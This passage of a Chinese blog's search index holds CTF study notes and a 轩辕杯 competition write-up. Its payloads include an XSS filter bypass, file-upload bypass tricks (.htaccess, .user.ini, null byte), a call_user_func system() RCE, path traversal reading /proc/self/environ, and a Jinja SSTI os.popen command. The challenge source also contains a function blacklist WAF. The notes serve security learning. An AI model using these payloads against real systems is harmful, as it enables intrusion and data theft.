    <content type="html"><![CDATA[<h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><h2 id="构造闭合"><a href="#构造闭合" class="headerlink" title="构造闭合"></a>构造闭合</h2><p>  浮生日记 </p><p> title提示让我们弹个窗</p><p> 测过无ssti，结合题目名字，合理可以想到js注入</p><p> 发现替换了script为空，然后赋值给value</p><p> 显然可以先闭合value，然后独立出一个script执行恶意代码</p><p> payload:</p><p>“&gt;<scrscriptipt>alert(1)</scrscriptipt><br>————————————————</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="/2025/06/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/06/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>文件上传漏洞是指服务器对用户上传的文件类型或内容未严格限制，导致攻击者可上传恶意文件（如木马、脚本），从而在服务器上执行恶意代码的漏洞。</p><h1 id="1-js检查"><a href="#1-js检查" class="headerlink" title="1.js检查:"></a>1.js检查:</h1><p>先是后缀为.jpg，然后利用bp抓包，将后缀改成.php</p><h1 id="2-可解析后缀"><a href="#2-可解析后缀" class="headerlink" title="2.可解析后缀:"></a>2.可解析后缀:</h1><p>如php3 php2等</p><h1 id="3-上传-htaccess和-user-ini文件"><a href="#3-上传-htaccess和-user-ini文件" class="headerlink" title="3.上传.htaccess和.user.ini文件:"></a>3.上传.htaccess和.user.ini文件:</h1><p>就是在Apache服务器中加入特殊脚本，将特定后缀名当做php解析,再上传jpg文件即可</p><p> <code>AddType application/x-httpd-php .jpg</code></p><p>上传完配置文件要访问&#x2F;upload&#x2F;1.png激活木马</p><p>.user.ini</p><p><code>auto_append_file=1.txt</code></p><h1 id="4-大小写绕过"><a href="#4-大小写绕过" class="headerlink" title="4.大小写绕过"></a>4.大小写绕过</h1><h1 id="5-DATA绕过"><a href="#5-DATA绕过" class="headerlink" title="5.::$DATA绕过:"></a>5.::$DATA绕过:</h1><p>利用bp，在php后面加::$DATA</p><p>仅仅windows可以</p><h1 id="6-双写绕过"><a href="#6-双写绕过" class="headerlink" title="6.双写绕过:"></a>6.双写绕过:</h1><p> .pphphp 自动识别第一个php使之为空(后端黑名单删后缀)</p><h1 id="7-0x00绕过"><a href="#7-0x00绕过" class="headerlink" title="7.0x00绕过:"></a>7.0x00绕过:</h1><p>利用bp，修改上传路径包含.php然后加上0x00，使后面的内容无效</p><h1 id="8-黑名单绕过"><a href="#8-黑名单绕过" class="headerlink" title="8.黑名单绕过:"></a>8.黑名单绕过:</h1><p>后缀名后加空格或特殊字符.</p><p>若为一次校验，则在php后使用. <strong>.空格</strong>绕过</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>轩辕杯</title>
    <link href="/2025/06/11/%E8%BD%A9%E8%BE%95%E6%9D%AF/"/>
    <url>/2025/06/11/%E8%BD%A9%E8%BE%95%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h3 id="轩辕杯"><a href="#轩辕杯" class="headerlink" title="轩辕杯"></a>轩辕杯</h3><h2 id="1-ezrce"><a href="#1-ezrce" class="headerlink" title="1.ezrce"></a>1.ezrce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>) </span>&#123;<br>    <span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;shell_exec&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;passthru&quot;</span>, <span class="hljs-string">&quot;proc_open&quot;</span>, <span class="hljs-string">&quot;show_source&quot;</span>,<br>        <span class="hljs-string">&quot;phpinfo&quot;</span>, <span class="hljs-string">&quot;popen&quot;</span>, <span class="hljs-string">&quot;dl&quot;</span>, <span class="hljs-string">&quot;proc_terminate&quot;</span>, <span class="hljs-string">&quot;touch&quot;</span>, <span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<br>        <span class="hljs-string">&quot;escapeshellarg&quot;</span>, <span class="hljs-string">&quot;assert&quot;</span>, <span class="hljs-string">&quot;substr_replace&quot;</span>, <span class="hljs-string">&quot;call_user_func_array&quot;</span>,<br>        <span class="hljs-string">&quot;call_user_func&quot;</span>, <span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_map&quot;</span>,<br>        <span class="hljs-string">&quot;register_shutdown_function&quot;</span>, <span class="hljs-string">&quot;register_tick_function&quot;</span>, <span class="hljs-string">&quot;filter_var&quot;</span>,<br>        <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,<br>        <span class="hljs-string">&quot;array_walk_recursive&quot;</span>, <span class="hljs-string">&quot;pcntl_exec&quot;</span>, <span class="hljs-string">&quot;fopen&quot;</span>, <span class="hljs-string">&quot;fwrite&quot;</span>,<br>        <span class="hljs-string">&quot;file_put_contents&quot;</span>, <span class="hljs-string">&quot;readfile&quot;</span>, <span class="hljs-string">&quot;file_get_contents&quot;</span>, <span class="hljs-string">&quot;highlight_file&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span><br>    );<br><br>    <span class="hljs-variable">$disable_fun</span> = <span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-string">&#x27;strtolower&#x27;</span>, <span class="hljs-variable">$disable_fun</span>);<br>    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$a</span>);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$disable_fun</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;宝宝这对嘛,这不对噢&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$a</span>;<br>&#125;<br><br><span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br><span class="hljs-variable">$new</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;new&#x27;</span>];<br><span class="hljs-variable">$star</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;star&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$num</span>) &amp;&amp; <span class="hljs-variable">$num</span> != <span class="hljs-number">1234</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;看来第一层对你来说是小case&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$num</span>) &amp;&amp; <span class="hljs-variable">$num</span> &gt; <span class="hljs-number">1234</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;还是有点实力的嘛&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$new</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$star</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;看起来你遇到难关了哈哈&lt;br&gt;&quot;</span>;<br>            <span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$new</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$b</span>) &#123;<br>                <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$b</span>, <span class="hljs-variable">$star</span>);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;恭喜你，又成长了&lt;br&gt;&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>思路一:读文件</p><p>能读文件的函数有:<strong>readfile,readgzfile,highlight_file,file_get_content，show_source</strong></p><p><strong>注意var_dump和print_r并不能直接读文件，只能用来打印</strong></p><p>被ban了很多，还剩下readgzfile</p><p>于是构造new&#x3D;readgzfile&amp;star&#x3D;&#x2F;flag</p><p>思路二:rce</p><p>群里大佬的思路</p><p>new&#x3D;\system&amp;star&#x3D;cat &#x2F;flag</p><p>system，passthru</p><p>\system是php全局命名空间</p><h2 id="2-ezsql"><a href="#2-ezsql" class="headerlink" title="2.ezsql"></a>2.ezsql</h2><p>反思:可以先fuzz一下，得知哪些被禁用，然后想到可能可以双写绕过</p><p>思路:</p><p>打开题目,输入1正常查询,输入1 or 1&#x3D;1发现触发waf</p><p>单独输入or和1&#x3D;1发现都没有触发</p><p>说明过滤了空格,采用&#x2F;**&#x2F;绕过</p><p>尝试select发现无结果,并没有waf提示,猜测是被特殊处理,尝试大小写绕过以及双写</p><p>最终发现双写有效</p><h2 id="3-ezweb"><a href="#3-ezweb" class="headerlink" title="3.ezweb"></a>3.ezweb</h2><p>1.非预期</p><p>直接任意文件读取</p><p><img src="/%E5%9B%BE%E7%89%87/20125e48549f69dda75d2a263d99399.png"></p><p>直接读取..&#x2F;..&#x2F;..&#x2F;proc&#x2F;1&#x2F;environ的环境变量</p><p>2.先读取 </p><p>..&#x2F;..&#x2F;..&#x2F;app&#x2F;app.py源码，发现是模板渲染</p><p>..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;environ的环境变量找到jwt伪造的密钥</p><p>然后条件竞争，上传恶意的index.html渲染到页面实现ssti漏洞利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs payload">&#123;&#123;url_for.__globals__[&#x27;os&#x27;].popen(&#x27;cat /fllllllaaaggg&#x27;).read()&#125;&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>魔术方法的触发</title>
    <link href="/2025/06/11/%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6/"/>
    <url>/2025/06/11/%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="魔术方法的触发条件"><a href="#魔术方法的触发条件" class="headerlink" title="魔术方法的触发条件"></a>魔术方法的触发条件</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example1</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__wakeup方法被调用\n&quot;</span>;<br><span class="hljs-variable language_">$this</span>-&gt;data = <span class="hljs-string">&quot;初始化数据&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example2</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;1234&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__toString方法被调用\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;data;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example3</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__destruct 方法被调用\n&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example4</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$data</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__get 方法被调用，属性名：<span class="hljs-subst">$name</span>\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;data;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__set 方法被调用，属性名：<span class="hljs-subst">$name</span> 值：<span class="hljs-subst">$value</span>\n&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;data = <span class="hljs-variable">$value</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example5</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__call 方法被调用，方法名：<span class="hljs-subst">$method</span> 参数：&quot;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;, &#x27;</span>, <span class="hljs-variable">$args</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example6</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__callStatic</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__callStatic 方法被调用，方法名：<span class="hljs-subst">$method</span> 参数：&quot;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;, &#x27;</span>, <span class="hljs-variable">$args</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example7</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>, <span class="hljs-variable">$arg2</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__invoke 方法被调用，参数：<span class="hljs-subst">$arg1</span>, <span class="hljs-subst">$arg2</span>\n&quot;</span>;<br>    &#125;<br>&#125;<br><br><br><br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Example1</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Example2</span>();<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Example3</span>();<br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Example4</span>();<br><span class="hljs-variable">$e</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Example5</span>();<br><span class="hljs-variable">$f</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Example6</span>();<br><span class="hljs-variable">$g</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Example7</span>();<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));                     <span class="hljs-comment">//  _wakeup触发条件:unserialize</span><br><span class="hljs-title function_ invoke__">strlen</span>( <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>)));            <span class="hljs-comment">// _tostring触发条件:ehco,print,与字符串作比较,strlen,addslashes等与字符串有关的函数</span><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>));                     <span class="hljs-comment">//_destruct触发条件:实例化，unset，若未被销毁，最后终会触发一次</span><br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$d</span>-&gt;data;                                  <span class="hljs-comment">//_get触发方法:读取不可访问(不存在也算不可访问)的属性</span><br><span class="hljs-variable">$d</span>-&gt;data=<span class="hljs-number">123</span>;                                   <span class="hljs-comment">//_set触发方法：修改不可访问(不存在也算不可访问)的属性</span><br><span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">i</span>();                                        <span class="hljs-comment">//_call触发方法：调用不存在的方法,主要是方法，所以带括号，参数可有可无</span><br><span class="hljs-title class_">Example6</span>::<span class="hljs-title function_ invoke__">i</span>();                                  <span class="hljs-comment">//_callstatic触发方法：静态调用不存在的方法，而不是实例化调用</span><br><span class="hljs-variable">$g</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>);                           <span class="hljs-comment">// _invoke触发条件: 对象被当作函数调用，且参数数量多于</span><br>                                                <span class="hljs-comment">//_isset触发条件:对不可访问的属性使用isset()或者empty()函数</span><br>                                                <span class="hljs-comment">//_unset触发条件:对不可访问的属性使用unset()</span><br>                                                <span class="hljs-comment">//_clone触发条件：使用clone函数</span><br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;  _wakeup触发条件:unserialize<br>&#x2F;&#x2F;  _tostring触发条件:ehco,print,与字符串作比较,strlen,addslashes等与字符串有关的函数<br>&#x2F;&#x2F;_destruct触发条件:实例化，unset，若未被销毁，最后终会触发一次</p><p>&#x2F;&#x2F;_get触发方法:读取不可访问(不存在也算不可访问)的属性<br>&#x2F;&#x2F;_set触发方法：修改不可访问(不存在也算不可访问)的属性<br>&#x2F;&#x2F;_call触发方法：调用不存在的方法,主要是方法，所以带括号，参数可有可无<br>&#x2F;&#x2F;_callstatic触发方法：静态调用不存在的方法，而不是实例化调用<br>&#x2F;&#x2F; _invoke触发条件：对象被当作函数调用，且参数数量多于<br>&#x2F;&#x2F;_isset触发条件:对不可访问的属性使用isset()或者empty()函数<br>&#x2F;&#x2F;_unset触发条件:对不可访问的属性使用unset()函数<br>&#x2F;&#x2F;_clone触发条件：使用clone函数</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
